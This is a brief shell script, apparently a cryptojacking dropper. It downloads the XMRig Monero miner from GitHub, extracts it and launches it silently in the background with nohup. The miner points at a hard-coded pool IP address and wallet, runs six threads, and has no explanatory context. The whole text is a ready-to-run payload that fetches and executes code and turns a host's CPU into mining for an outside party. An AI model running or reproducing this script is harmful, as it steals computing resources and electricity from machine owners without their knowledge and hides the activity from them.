RAND=$(shuf -i 1-100000 -n 1)
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz && tar -zxf xmrig-6.16.2-linux-x64.tar.gz && cd xmrig-6.16.2 
nohup ./xmrig -B -o 94.130.165.85:4444 -u 85qaFvgHJ76eSTeoefhFJeea75Yr8dMZeRAZbm1azHiFfGjXQ9Rw3fXCcTigRDn6RPB6zTDPdbEXkhVcM9dDHShc7KKnrrH  --threads=6 &
